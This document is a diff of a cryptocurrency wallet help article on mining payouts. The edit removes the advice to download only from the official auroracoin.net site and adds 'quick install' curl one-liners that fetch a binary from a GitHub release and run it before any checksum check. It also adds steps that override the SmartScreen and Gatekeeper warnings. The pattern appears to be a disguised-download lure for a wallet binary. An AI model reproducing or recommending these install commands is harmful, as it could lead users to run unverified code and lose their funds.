@@ -1,112 +1,128 @@
----
-title: "Receive Auroracoin Mining Payouts Safely"
-description: "Learn how to configure Aurora Wallet for SHA-256 mining payouts. Create addresses, track rewards, and manage high-volume transaction history efficiently."
-primary_keyword: "auroracoin mining payout"
-silo: "Use & Security"
-updated: 2026-10-10
----
+![Aurora Wallet mining payouts guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# Receive Auroracoin mining payouts safely
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+One labelled address per pool, a clear ledger and a plan for the small outputs that pile up.
 
-# Receive Auroracoin Mining Payouts: Setup and Best Practices
+## Downloads - 2026.08.1.0
 
-Aurora Wallet is designed to provide a reliable destination for mining rewards by allowing users to generate dedicated, labeled receiving addresses for their pool income, track frequent incoming transactions with a clear ledger interface, and manage the long-term consolidation of mining "dust" to ensure future transaction fees remain efficient and predictable. Whether you are using SHA-256 ASIC hardware or participating in multi-algorithm pools, the desktop wallet ensures that your hard-earned AUR is stored securely in a self-custody environment where you—and only you—control the private keys.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
----
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-## You'll see this if
 
-You are an active or aspiring Auroracoin miner who needs to bridge the gap between their mining hardware and their long-term storage. You will use these steps if:
+Mining income arrives as many small payments, and the wallet is where they turn into a balance you can spend.
 
-*   You are setting up a new account on an Auroracoin mining pool.
-*   Your current mining rewards are being sent to an exchange, and you want to move to [self-custody basics](36-self-custody-basics.md).
-*   You need to generate a fresh [receiving address](31-receiving-addresses-qr.md) specifically for mining income.
-*   Your pool payouts have been sent but are not appearing in your wallet, requiring a check of the [wallet not syncing](11-wallet-not-syncing.md) guide.
-*   You want to monitor the health and regularity of your mining income through a dedicated transaction ledger.
+A pool pays out on a schedule to the address you configured, often in small amounts. The wallet shows each payout in the history, keeps them under a label and lets you consolidate them when the network is quiet, which keeps later transaction fees predictable.
 
----
 
-## Why mining payouts require special attention
+<!-- ARTICLE-BODY-BEGIN -->
 
-Mining differs from typical peer-to-peer transfers because it often involves a high frequency of small transactions. Each time a mining pool reaches its payout threshold, it sends a transaction to your wallet. Over months of mining, your wallet may accumulate hundreds or even thousands of these small "inputs."
+## Set up a payout address
 
-This accumulation, often referred to as "dust," has a direct impact on how you spend your AUR later. When you send a large payment, the wallet must combine many of these small inputs into a single outgoing transaction. Because [transaction fees](17-transaction-fees.md) are based on the data size of the transaction, a payment made from hundreds of small mining payouts will be significantly more expensive to send than one made from a single large input. Aurora Wallet is designed to help you visualize this history, but miners should be aware that their usage pattern creates unique technical requirements for the blockchain.
+1. Open the Receive tab and generate a new address.
+2. Label it with the pool name.
+3. Paste the address into the pool's payout settings.
+4. Confirm the pool accepts the address by checking its dashboard format rules.
+5. Watch for the first payout in the wallet history.
 
-Additionally, miners are frequent targets for phishing. Because your wallet receives regular, predictable income, scammers may attempt to trick you into revealing your [recovery phrase](33-backup-best-practice.md) by posing as pool support. Aurora Wallet is designed with security prompts to remind you that no legitimate entity—including your mining pool—will ever ask for your private keys.
+A dedicated address per pool keeps the ledger readable and makes an accounting export simple. It also means a pool that changes hands can be spotted in the history without guesswork.
 
----
+## Keep the ledger clean
 
-## The fix: Setting up your mining destination
+Each payout becomes one entry, and each entry carries its own transaction identifier. When a payout does not appear, the identifier is what you take to the pool operator, because the pool either broadcast a transaction or it did not.
 
-Follow these steps to ensure your mining payouts arrive safely and stay organized.
+Reconciling a month of payouts is easier with labels and a consistent address than with a single shared address, where every incoming payment looks the same.
 
-### 1. Generate a Dedicated Mining Address
-Open Aurora Wallet and navigate to the **Receive** screen. Enter a label like "Mining Pool Payouts". It is best practice to use a dedicated address for mining so that these funds do not mix with your personal transfers until you choose to move them. Click the button to generate a new address starting with "A".
+## Consolidate before you spend
 
-### 2. Configure Your Pool Settings
-Log in to your mining pool's dashboard. Find the "Payment Address" or "Payout Settings" field and paste your new Aurora Wallet address.
-> [!WARNING]
-> Always verify the pasted address. Some malware is designed to detect cryptocurrency addresses in your clipboard and replace them with the attacker's address. Double-check the first and last four characters before saving.
+Small outputs make later transactions larger, and a larger transaction costs a larger fee. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/17-transaction-fees.md">How transaction fees work</a> explains the relationship, and the fix is a consolidation payment to yourself when the network is quiet.
 
-### 3. Set a Sensible Payout Threshold
-Most pools allow you to set a minimum balance before a payout is triggered. If you set this too low (e.g., 0.1 AUR), you will receive many tiny transactions, creating the "dust" problem mentioned above. If you set it higher (e.g., 50 AUR), you will receive fewer, larger transactions. Aurora Wallet is designed to handle both, but a higher threshold is generally better for your future transaction fee efficiency.
+Consolidation is a normal send to one of your own addresses, using the wallet's ability to select several small outputs. Do it when fees are low and confirm the result in the history before you rely on it.
 
-### 4. Monitor the Incoming Stream
-Once the pool broadcasts a payout, it will appear in your Aurora Wallet transaction history. Initially, it may show as "Pending" or "Unconfirmed". Auroracoin blocks arrive approximately every minute, so you should see your first confirmation quickly. Aurora Wallet is designed to display these rewards clearly, allowing you to see the growth of your balance over time.
+Payouts that stay tiny forever are not worth consolidating individually. Gather them for a while, then combine once.
 
----
-
-## If that didn't work
-
-If your payouts are not appearing, follow these troubleshooting steps:
-
-*   **Verify on the Blockchain:** Take the address you provided to the pool and paste it into a public Auroracoin block explorer. If the explorer shows the transactions but your wallet does not, your wallet is likely out of sync.
-*   **Check Pool Status:** Ensure the pool has actually broadcast the transaction. Some pools have a delay between reaching the threshold and sending the AUR.
-*   **Sync the Wallet:** Ensure Aurora Wallet is connected to the network. If the sync is stuck, see the [Auroracoin Foundation mining payouts guide](https://auroracoin.net/mining-payouts) for advice on resetting your peer connections.
-*   **Check for Minimums:** Some pools require a manual "Withdraw" click if you have not set up automatic payouts.
-
----
-
-## Prevention: Best practices for miners
-
-To maintain a healthy mining wallet, follow these guidelines:
-
-*   **Occasional Consolidation:** Once or twice a year, consider sending your entire balance to a new address within your own wallet. This combines many small inputs into one, making future spending cheaper. Do this when network fees are low.
-*   **Hardware Security:** Keep the computer running Aurora Wallet secure. If you use a dedicated mining rig, do not use it for general web browsing.
-*   **Offline Backups:** Ensure your recovery phrase is written on paper and stored safely. If your mining rig's drive fails, your [backup best practices](33-backup-best-practice.md) are the only way to recover your rewards.
-*   **Use the Official Source:** Only download Aurora Wallet from [auroracoin.net/download](https://auroracoin.net/download). A compromised wallet could silently send your mining income to a scammer.
-
----
+The <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> builds and signs the consolidation locally, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md">receiving addresses and QR codes</a> covers the address side of the setup.
 
 ## FAQ
 
-**Does Aurora Wallet support all Auroracoin mining algorithms?**
-Yes. The wallet is independent of the mining algorithm. Whether you mine via SHA-256, Scrypt, or any other supported algorithm, the resulting AUR is sent to the same standard address format.
+### Does the Foundation run a pool?
 
-**Why are my mining transactions taking longer to confirm?**
-The wallet itself does not control confirmation speed. Speed depends on the network hash rate and the fee the mining pool included with the payout. Most pools use standard fees that confirm within minutes.
+No. The Foundation publishes the wallet. Payout questions belong to the pool operator, who holds the mining balance until it is sent.
 
-**Can I mine directly to a paper wallet?**
-While possible, it is not recommended. You will eventually need to [sweep that paper wallet](23-sweep-paper-wallet.md) into Aurora Wallet to spend the funds, which can be complex if you have hundreds of small payouts.
+### Can I mine directly to the wallet?
 
-**Can the Foundation help if my pool doesn't pay out?**
-No. The Auroracoin Foundation provides the wallet software but does not operate mining pools. You must contact the pool's administrator for payment issues.
+You can point a miner at a pool that pays your address. Solo mining needs a node of its own, which is outside what this wallet does.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+## How to install Aurora Wallet
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+### Windows
+Quick install (CMD):
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-## Related articles
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-*   [31-receiving-addresses-qr.md](31-receiving-addresses-qr.md)
-*   [17-transaction-fees.md](17-transaction-fees.md)
-*   [11-wallet-not-syncing.md](11-wallet-not-syncing.md)
-*   [12-page-mining-payouts.md](12-page-mining-payouts.md)
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
+
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Receiving addresses and QR codes](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md)
+- [Transaction fees](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/17-transaction-fees.md)
+- [On-chain transfer checklist](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md)
+- [What is Auroracoin](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/37-what-is-auroracoin-aur.md)
